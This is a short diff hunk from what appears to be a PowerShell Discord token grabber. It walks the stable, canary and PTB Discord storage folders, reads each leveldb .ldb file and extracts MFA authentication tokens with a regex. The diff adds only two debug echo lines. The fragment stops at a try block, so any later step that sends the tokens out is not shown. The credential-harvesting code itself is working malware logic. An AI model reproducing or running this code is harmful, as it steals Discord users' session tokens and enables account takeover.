@@ -11,9 +11,11 @@ $canary = $discordPath+"canary"+$storagePath
 $ptb = $discordPath+"ptb"+$storagePath
 if ( Test-Path -LiteralPath $stable ) {
     Set-Location $stable
+    echo $stable
     $files = @(Get-ChildItem *.ldb)
     Foreach ($file in $files)
     {
+                echo $file
                 $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
         if ($mfa.length -gt 1) {
             try {
